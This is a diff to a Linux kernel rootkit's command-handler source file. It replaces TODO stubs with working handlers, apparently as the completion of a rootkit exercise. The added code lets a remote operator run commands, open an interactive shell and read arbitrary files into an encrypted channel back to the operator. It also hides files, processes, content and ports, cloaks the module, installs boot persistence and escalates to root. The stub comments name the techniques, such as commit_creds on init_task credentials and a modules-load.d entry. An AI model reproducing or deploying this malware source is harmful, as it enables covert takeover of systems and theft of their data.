@@ -1,126 +1,228 @@
 // SPDX-License-Identifier: GPL-2.0
-//
-// Command handlers: all rootkit operations.
-//
-// Query, hide/unhide targets, module cloaking, persistence,
-// privilege escalation, and file exfiltration. Every response
-// goes through the AEAD sealed channel via RK_REPLY.
-//
-#include <linux/cred.h>
+// execution/commands.c - Individual command handlers.
 #include <linux/fs.h>
-#include <linux/kernel.h>
-#include <linux/sched/task.h>
+#include <linux/slab.h>
 #include <linux/string.h>
-#include <linux/umh.h>
 #include <linux/utsname.h>
-
 #include "rootkit.h"
 
-// ---- generic hide/unhide for string targets ----
-
-int rk_cmd_hide_target(struct rk_session *s,
-		       struct rk_target_list *list, const char *value)
+int cmd_ping(struct rk_session *s, const char *arg)
 {
-	// TODO: rk_target_add, reply "full\n" / "too long\n" / "hidden\n"
-	return -ENOSYS;
+	return rk_send_response(s, "PONG");
 }
 
-int rk_cmd_unhide_target(struct rk_session *s,
-			 struct rk_target_list *list, const char *value)
+int cmd_status(struct rk_session *s, const char *arg)
 {
-	// TODO: rk_target_remove, reply "not found\n" / "unhidden\n"
-	return -ENOSYS;
+	char buf[256];
+
+	snprintf(buf, sizeof(buf),
+		 "files=%d pids=%d content=%d ports=%d",
+		 rk_file_targets.count, rk_pid_targets.count,
+		 rk_content_targets.count, rk_port_targets.count);
+	return rk_send_response(s, buf);
 }
 
-// ---- simple query commands ----
-
-int rk_cmd_ping(struct rk_session *s)
+int cmd_info(struct rk_session *s, const char *arg)
 {
-	// TODO: RK_REPLY "PONG\n"
-	return -ENOSYS;
+	char buf[256];
+
+	snprintf(buf, sizeof(buf), "%s %s %s",
+		 utsname()->sysname, utsname()->release, utsname()->machine);
+	return rk_send_response(s, buf);
 }
 
-int rk_cmd_info(struct rk_session *s)
+int cmd_shell(struct rk_session *s, const char *arg)
 {
-	// TODO: utsname() fields, snprintf into buf, rk_send_sealed
-	return -ENOSYS;
+	rk_start_interactive();
+	return rk_send_response(s, "SHELL OK");
 }
 
-int rk_cmd_status(struct rk_session *s)
+int cmd_exec(struct rk_session *s, const char *arg)
 {
-	// TODO: Report counts from target lists, cloaked/persisted flags
-	return -ENOSYS;
+	if (!arg || !*arg)
+		return rk_send_response(s, "ERR missing argument");
+	rk_start_exec(arg);
+	return rk_send_response(s, "EXEC OK");
 }
 
-int rk_cmd_list(struct rk_session *s, const char *category)
+int cmd_download(struct rk_session *s, const char *arg)
 {
-	// TODO: Dispatch on category string (FILE, PID, CONTENT, PORT),
-	// iterate under lock, send each entry sealed
-	return -ENOSYS;
+	struct file *f;
+	char *buf;
+	loff_t pos = 0;
+	int error = 0;
+
+	if (!arg || !*arg)
+		return rk_send_response(s, "ERR missing path");
+
+	f = filp_open(arg, O_RDONLY, 0);
+	if (IS_ERR(f))
+		return rk_send_response(s, "ERR open failed");
+
+	buf = kmalloc(RK_CHUNK_SIZE, GFP_KERNEL);
+	if (!buf) {
+		filp_close(f, NULL);
+		return -ENOMEM;
+	}
+
+	for (;;) {
+		ssize_t bytes_read;
+
+		bytes_read = kernel_read(f, buf, RK_CHUNK_SIZE, &pos);
+		if (bytes_read < 0) {
+			error = (int)bytes_read;
+			break;
+		}
+		if (bytes_read == 0)
+			break;
+
+		error = rk_send_sealed(s, (u8 *)buf, bytes_read);
+		if (error)
+			break;
+	}
+
+	if (!error)
+		error = rk_send_sealed(s, (const u8 *)"", 0);
+
+	kfree(buf);
+	filp_close(f, NULL);
+	return error;
 }
 
-int rk_cmd_unhide_all(struct rk_session *s)
+int cmd_hide_file(struct rk_session *s, const char *arg)
 {
-	// TODO: Zero all 4 target list counts under their locks
-	return -ENOSYS;
+	if (!arg || !*arg)
+		return rk_send_response(s, "ERR missing argument");
+	rk_target_add(&rk_file_targets, arg);
+	return rk_send_response(s, "HIDE FILE OK");
 }
 
-// ---- port-specific hide/unhide ----
-
-int rk_cmd_hide_port(struct rk_session *s, const char *arg)
+int cmd_unhide_file(struct rk_session *s, const char *arg)
 {
-	// TODO: kstrtou16, validate non-zero, rk_port_add
-	return -ENOSYS;
+	int idx;
+
+	if (!arg || kstrtoint(arg, 10, &idx) != 0)
+		return rk_send_response(s, "ERR bad index");
+	rk_target_remove(&rk_file_targets, idx);
+	return rk_send_response(s, "UNHIDE FILE OK");
 }
 
-int rk_cmd_unhide_port(struct rk_session *s, const char *arg)
+int cmd_hide_pid(struct rk_session *s, const char *arg)
 {
-	// TODO: kstrtou16, validate non-zero, rk_port_remove
-	return -ENOSYS;
+	if (!arg || !*arg)
+		return rk_send_response(s, "ERR missing argument");
+	rk_target_add(&rk_pid_targets, arg);
+	return rk_send_response(s, "HIDE PID OK");
 }
 
-// ---- module cloaking ----
-
-int rk_cmd_hide_module(struct rk_session *s)
+int cmd_unhide_pid(struct rk_session *s, const char *arg)
 {
-	// TODO: If already hidden reply so; else rk_cloak_module
-	return -ENOSYS;
+	int idx;
+
+	if (!arg || kstrtoint(arg, 10, &idx) != 0)
+		return rk_send_response(s, "ERR bad index");
+	rk_target_remove(&rk_pid_targets, idx);
+	return rk_send_response(s, "UNHIDE PID OK");
 }
 
-int rk_cmd_unhide_module(struct rk_session *s)
+int cmd_hide_content(struct rk_session *s, const char *arg)
 {
-	// TODO: If already visible reply so; else rk_uncloak_module
-	return -ENOSYS;
+	if (!arg || !*arg)
+		return rk_send_response(s, "ERR missing argument");
+	rk_target_add(&rk_content_targets, arg);
+	return rk_send_response(s, "HIDE CONTENT OK");
 }
 
-// ---- persistence via filp_open + kernel_write ----
-
-int rk_cmd_persist(struct rk_session *s)
+int cmd_unhide_content(struct rk_session *s, const char *arg)
 {
-	// TODO: filp_open /etc/modules-load.d/rklings.conf (O_WRONLY|O_CREAT|O_TRUNC),
-	// kernel_write "rklings\n", filp_close, set rk_persist_active
-	return -ENOSYS;
+	int idx;
+
+	if (!arg || kstrtoint(arg, 10, &idx) != 0)
+		return rk_send_response(s, "ERR bad index");
+	rk_target_remove(&rk_content_targets, idx);
+	return rk_send_response(s, "UNHIDE CONTENT OK");
 }
 
-int rk_cmd_unpersist(struct rk_session *s)
+int cmd_hide_port(struct rk_session *s, const char *arg)
 {
-	// TODO: call_usermodehelper to rm the conf file, clear flag
-	return -ENOSYS;
+	if (!arg || !*arg)
+		return rk_send_response(s, "ERR missing argument");
+	rk_target_add(&rk_port_targets, arg);
+	return rk_send_response(s, "HIDE PORT OK");
 }
 
-// ---- privilege escalation ----
-
-int rk_cmd_escalate(struct rk_session *s)
+int cmd_unhide_port(struct rk_session *s, const char *arg)
 {
-	// TODO: prepare_kernel_cred(&init_task) + commit_creds
-	return -ENOSYS;
+	int idx;
+
+	if (!arg || kstrtoint(arg, 10, &idx) != 0)
+		return rk_send_response(s, "ERR bad index");
+	rk_target_remove(&rk_port_targets, idx);
+	return rk_send_response(s, "UNHIDE PORT OK");
 }
 
-// ---- file exfiltration ----
-
-int rk_cmd_download(struct rk_session *s, const char *path)
+int cmd_list(struct rk_session *s, const char *arg)
 {
-	// TODO: filp_open(path, O_RDONLY), loop kernel_read + rk_send_sealed,
-	// filp_close, send trailing newline
-	return -ENOSYS;
+	struct rk_target_list *list = NULL;
+	char resp[512];
+	int i, pos;
+	unsigned long flags;
+
+	if (!arg)
+		return rk_send_response(s, "ERR missing list name");
+
+	if (strcmp(arg, "FILE") == 0)
+		list = &rk_file_targets;
+	else if (strcmp(arg, "PID") == 0)
+		list = &rk_pid_targets;
+	else if (strcmp(arg, "CONTENT") == 0)
+		list = &rk_content_targets;
+	else if (strcmp(arg, "PORT") == 0)
+		list = &rk_port_targets;
+	else
+		return rk_send_response(s, "ERR unknown list");
+
+	pos = 0;
+	spin_lock_irqsave(&list->lock, flags);
+	for (i = 0; i < list->count && pos < (int)sizeof(resp) - 64; i++) {
+		pos += snprintf(resp + pos, sizeof(resp) - pos,
+				"%d %s\n", i, list->targets[i]);
+	}
+	spin_unlock_irqrestore(&list->lock, flags);
+
+	if (pos == 0)
+		return rk_send_response(s, "LIST EMPTY");
+
+	resp[pos] = '\0';
+	return rk_send_response(s, resp);
+}
+
+int cmd_persist(struct rk_session *s, const char *arg)
+{
+	rk_persist();
+	return rk_send_response(s, "PERSIST OK");
+}
+
+int cmd_unpersist(struct rk_session *s, const char *arg)
+{
+	rk_unpersist();
+	return rk_send_response(s, "UNPERSIST OK");
+}
+
+int cmd_escalate(struct rk_session *s, const char *arg)
+{
+	rk_escalate();
+	return rk_send_response(s, "ESCALATE OK");
+}
+
+int cmd_cloak(struct rk_session *s, const char *arg)
+{
+	rk_cloak();
+	return rk_send_response(s, "CLOAK OK");
+}
+
+int cmd_uncloak(struct rk_session *s, const char *arg)
+{
+	rk_uncloak();
+	return rk_send_response(s, "UNCLOAK OK");
 }
